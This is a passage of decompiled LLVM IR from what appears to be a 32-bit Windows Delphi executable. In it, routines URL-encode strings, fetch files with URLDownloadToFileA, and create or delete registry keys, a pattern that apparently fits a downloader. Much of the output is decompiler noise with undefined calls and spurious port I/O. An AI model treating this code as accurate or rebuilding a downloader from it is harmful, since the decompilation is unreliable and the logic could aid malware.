  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !480
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !481
  %2 = add i32 %1, -1, !insn.addr !481
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !481
  ret i32 %0, !insn.addr !482
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !483
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !483
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !483
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !484
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !485
  %3 = add i32 %2, 1, !insn.addr !485
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !485
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !486
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !487
  ret i32 0, !insn.addr !488
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !489
  ret i32 %0, !insn.addr !489
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !490
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !491
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !492
  %2 = add i32 %1, -1, !insn.addr !492
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !492
  ret i32 %0, !insn.addr !493
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !494
  ret i32 %0, !insn.addr !494
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !495
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !495
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !495
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !496
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !497
  %3 = add i32 %2, 1, !insn.addr !497
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !497
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !498
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !499
  ret i32 0, !insn.addr !500
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !501
  ret i32 %0, !insn.addr !501
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !502
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !503
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !504
  %2 = add i32 %1, -1, !insn.addr !504
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !504
  ret i32 %0, !insn.addr !505
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !506
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !507

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !508
  ret i32 %4, !insn.addr !509

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !510
  ret i32 %5, !insn.addr !511
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !512
  %esp.1.reg2mem = alloca i32, !insn.addr !512
  %cf.0.reg2mem = alloca i1, !insn.addr !512
  %esi.0.reg2mem = alloca i32, !insn.addr !512
  %esp.0.reg2mem = alloca i32, !insn.addr !512
  %ebx.0.reg2mem = alloca i32, !insn.addr !512
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !513
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !514
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !514
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !514
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !515
  %4 = call i32 @"@LStrClr"(), !insn.addr !516
  %5 = call i32 @function_4034c8(), !insn.addr !517
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !518
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !518

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !519
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !519
  %9 = inttoptr i32 %8 to i8*, !insn.addr !519
  %10 = load i8, i8* %9, align 1, !insn.addr !519
  %11 = icmp eq i8 %10, 32, !insn.addr !519
  %12 = icmp eq i1 %11, false, !insn.addr !520
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !520

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !521
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !522
  br label %dec_label_pc_404c19, !insn.addr !522

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !523
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !524

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !525
  %16 = icmp ult i8 %15, 95, !insn.addr !526
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !527
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !527

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !528
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !528
  %21 = shl i32 1, %20, !insn.addr !528
  %22 = and i32 %18, %21, !insn.addr !528
  %23 = icmp ne i32 %22, 0, !insn.addr !528
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !528
  br label %dec_label_pc_404ba9, !insn.addr !528

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !529
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !529

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !530
  %27 = add i32 %esp.0.reload, -4, !insn.addr !531
  %28 = inttoptr i32 %27 to i32*, !insn.addr !531
  store i32 %26, i32* %28, align 4, !insn.addr !531
  %29 = add i32 %esp.0.reload, -8, !insn.addr !532
  %30 = inttoptr i32 %29 to i32*, !insn.addr !532
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !532
  %31 = call i32 @function_404b08(), !insn.addr !533
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !534
  %33 = add i32 %esp.0.reload, -12, !insn.addr !535
  %34 = inttoptr i32 %33 to i32*, !insn.addr !535
  store i32 0, i32* %34, align 4, !insn.addr !535
  %35 = call i32 @function_404b08(), !insn.addr !536
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !537
  %37 = add i32 %esp.0.reload, -16, !insn.addr !538
  %38 = inttoptr i32 %37 to i32*, !insn.addr !538
  store i32 0, i32* %38, align 4, !insn.addr !538
  %39 = call i32 @"@LStrCatN"(), !insn.addr !539
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !540
  br label %dec_label_pc_404c19, !insn.addr !540

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !541
  %41 = call i32 @"@LStrCat"(), !insn.addr !542
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !542
  br label %dec_label_pc_404c19, !insn.addr !542

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !543
  %43 = add i32 %esi.0.reload, -1, !insn.addr !544
  %44 = icmp eq i32 %43, 0, !insn.addr !544
  %45 = icmp eq i1 %44, false, !insn.addr !545
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !545
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !545
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !545
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !545
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !545

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !546
  %47 = load i32, i32* %46, align 4, !insn.addr !546
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !547
  %48 = add i32 %esp.2.reload, 8, !insn.addr !548
  %49 = inttoptr i32 %48 to i32*, !insn.addr !548
  store i32 4213835, i32* %49, align 4, !insn.addr !548
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !549
  %51 = call i32 @"@LStrClr"(), !insn.addr !550
  ret i32 %51, !insn.addr !551
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !552
  ret i32 %0, !insn.addr !552
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !553
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !554
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !555
  %2 = inttoptr i32 %0 to i32*, !insn.addr !555
  store i32 %1, i32* %2, align 4, !insn.addr !555
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !556
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !556
  %7 = add i8 %4, %6, !insn.addr !556
  %8 = inttoptr i32 %5 to i8*, !insn.addr !556
  store i8 %7, i8* %8, align 1, !insn.addr !556
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !557
  %10 = load i32, i32* %eax, align 4, !insn.addr !557
  %11 = udiv i32 %10, 256, !insn.addr !557
  %12 = trunc i32 %11 to i8, !insn.addr !557
  %13 = add i8 %9, %12, !insn.addr !557
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !557
  %14 = call i32 @function_4036b8(), !insn.addr !558
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !559
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !559
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !559
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !560
  %17 = call i32 @"@LStrCatN"(), !insn.addr !561
  %18 = call i32 @function_4036c8(), !insn.addr !562
  %19 = inttoptr i32 %18 to i32*, !insn.addr !563
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !563
  call void @__writefsdword(i32 0, i32 0), !insn.addr !564
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !565
  ret i32 %21, !insn.addr !566
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !567
  ret i32 %0, !insn.addr !567
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !568
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !569
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !570
  %5 = inttoptr i32 %3 to i32*, !insn.addr !570
  store i32 %4, i32* %5, align 4, !insn.addr !570
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !571
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !571
  %10 = add i8 %7, %9, !insn.addr !571
  %11 = inttoptr i32 %8 to i8*, !insn.addr !571
  store i8 %10, i8* %11, align 1, !insn.addr !571
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !572
  %14 = udiv i32 %1, 256, !insn.addr !572
  %15 = trunc i32 %14 to i8, !insn.addr !572
  %16 = add i8 %13, %15, !insn.addr !572
  %17 = load i32, i32* %edi, align 4, !insn.addr !572
  %18 = inttoptr i32 %17 to i8*, !insn.addr !572
  store i8 %16, i8* %18, align 1, !insn.addr !572
  %19 = load i8, i8* %6, align 4, !insn.addr !573
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !573
  %22 = add i8 %19, %21, !insn.addr !573
  %23 = inttoptr i32 %20 to i8*, !insn.addr !573
  store i8 %22, i8* %23, align 1, !insn.addr !573
  %24 = add i32 %0, -117, !insn.addr !574
  %25 = inttoptr i32 %24 to i8*, !insn.addr !574
  %26 = load i8, i8* %25, align 1, !insn.addr !574
  %27 = trunc i32 %2 to i8, !insn.addr !574
  %28 = add i8 %26, %27, !insn.addr !574
  store i8 %28, i8* %25, align 1, !insn.addr !574
  %29 = trunc i32 %2 to i16, !insn.addr !575
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !575
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !576
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !576
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !576
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !577
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !578
  %34 = add i32 %33, 1, !insn.addr !578
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !578
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !579
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !580
  ret i32 0, !insn.addr !581
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !582
  ret i32 %0, !insn.addr !582
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !583
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !584
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !585
  %2 = add i32 %1, -1, !insn.addr !585
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !585
  ret i32 %0, !insn.addr !586
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !587
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !588
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !589
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !590
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !591
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !592
  %2 = icmp eq i32 %1, 0, !insn.addr !593
  %3 = icmp eq i1 %2, false, !insn.addr !594
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !594
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !594

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !595
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !596
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !596
  %6 = icmp eq i32 %5, 0, !insn.addr !597
  %7 = icmp eq i1 %6, false, !insn.addr !598
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !598

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !599
  br label %dec_label_pc_404da9, !insn.addr !599

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !600
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !600
  br label %dec_label_pc_404db2, !insn.addr !600

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !601
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !602
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !602
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !602
  %6 = inttoptr i32 %3 to i32*, !insn.addr !602
  store i32 %5, i32* %6, align 4, !insn.addr !602
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !603
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !603
  %11 = add i8 %8, %10, !insn.addr !603
  %12 = inttoptr i32 %9 to i8*, !insn.addr !603
  store i8 %11, i8* %12, align 1, !insn.addr !603
  %13 = add i32 %1, 122, !insn.addr !604
  %14 = inttoptr i32 %13 to i8*, !insn.addr !604
  %15 = load i8, i8* %14, align 1, !insn.addr !604
  %16 = udiv i32 %4, 256, !insn.addr !604
  %17 = trunc i32 %16 to i8, !insn.addr !604
  %18 = add i8 %15, %17, !insn.addr !604
  store i8 %18, i8* %14, align 1, !insn.addr !604
  %19 = load i8, i8* %7, align 4, !insn.addr !605
  %20 = load i32, i32* %eax, align 4, !insn.addr !605
  %21 = trunc i32 %20 to i8, !insn.addr !605
  %22 = add i8 %19, %21, !insn.addr !605
  %23 = icmp eq i8 %22, 0, !insn.addr !605
  %24 = inttoptr i32 %20 to i8*, !insn.addr !605
  store i8 %22, i8* %24, align 1, !insn.addr !605
  %25 = trunc i32 %3 to i16, !insn.addr !606
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !606
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !607

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !607
  br label %dec_label_pc_404dc9, !insn.addr !607

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !605
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !608
  store i32 %29, i32* %eax, align 4, !insn.addr !608
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !609

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !345, !insn.addr !605
  %31 = and i8 %30, 1, !insn.addr !605
  %32 = icmp eq i8 %31, 0, !insn.addr !605
  %33 = trunc i32 %arg4 to i16, !insn.addr !610
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !610
  %35 = inttoptr i32 %2 to i32*, !insn.addr !610
  store i32 %34, i32* %35, align 4, !insn.addr !610
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !611

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !612
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !613
  %36 = add i32 %arg4, 1, !insn.addr !614
  %37 = icmp eq i32 %36, 0, !insn.addr !614
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !615
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !615

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !616
  %39 = add i32 %38, -1, !insn.addr !616
  store i32 %39, i32* %eax, align 4, !insn.addr !616
  %40 = trunc i32 %36 to i16, !insn.addr !617
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !617
  %42 = load i32, i32* %41, align 4, !insn.addr !617
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !617
  %43 = load i32, i32* %41, align 4, !insn.addr !618
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !618
  %44 = add i32 %arg7, 105, !insn.addr !619
  %45 = inttoptr i32 %44 to i8*, !insn.addr !619
  %46 = load i8, i8* %45, align 1, !insn.addr !619
  %47 = trunc i32 %39 to i8, !insn.addr !619
  %48 = add i8 %46, %47, !insn.addr !619
  %49 = icmp ult i8 %48, %46, !insn.addr !619
  store i8 %48, i8* %45, align 1, !insn.addr !619
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !620
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !620

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !619
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !621

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !622
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !623
  %53 = load i32, i32* %52, align 4, !insn.addr !623
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !623
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !624
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !625
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !626
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !627
  %55 = add i32 %arg6, -8, !insn.addr !628
  %56 = inttoptr i32 %55 to i32*, !insn.addr !628
  store i32 0, i32* %56, align 4, !insn.addr !628
  %57 = add i32 %arg6, -12, !insn.addr !629
  %58 = inttoptr i32 %57 to i32*, !insn.addr !629
  store i32 1, i32* %58, align 4, !insn.addr !629
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !630
  ret i32 %57, !insn.addr !630

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !631

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !632
  %62 = add i8 %60, %61, !insn.addr !632
  %63 = inttoptr i32 %2 to i8*, !insn.addr !632
  store i8 %62, i8* %63, align 1, !insn.addr !632
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !633
  %65 = load i8, i8* %64, align 1, !insn.addr !633
  %66 = udiv i32 %arg3, 256, !insn.addr !633
  %67 = trunc i32 %66 to i8, !insn.addr !633
  %68 = add i8 %65, %67, !insn.addr !633
  store i8 %68, i8* %64, align 1, !insn.addr !633
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !633
  br label %dec_label_pc_404e37, !insn.addr !633

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !634
  %70 = inttoptr i32 %69 to i32*, !insn.addr !634
  store i32 0, i32* %70, align 4, !insn.addr !634
  %71 = add i32 %esp.0, -8, !insn.addr !635
  %72 = inttoptr i32 %71 to i32*, !insn.addr !635
  store i32 0, i32* %72, align 4, !insn.addr !635
  %73 = add i32 %esp.0, -12, !insn.addr !636
  %74 = inttoptr i32 %73 to i32*, !insn.addr !636
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !636
  %75 = add i32 %esp.0, -16, !insn.addr !637
  %76 = inttoptr i32 %75 to i32*, !insn.addr !637
  store i32 -2147483647, i32* %76, align 4, !insn.addr !637
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !638
  %78 = call i32 @function_4034c8(), !insn.addr !639
  %79 = add i32 %78, 1, !insn.addr !640
  %80 = add i32 %esp.0, -20, !insn.addr !641
  %81 = inttoptr i32 %80 to i32*, !insn.addr !641
  store i32 %79, i32* %81, align 4, !insn.addr !641
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !642
  br label %dec_label_pc_404e57, !insn.addr !642

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !643
  %83 = add i32 %esp.1.reload, -4, !insn.addr !644
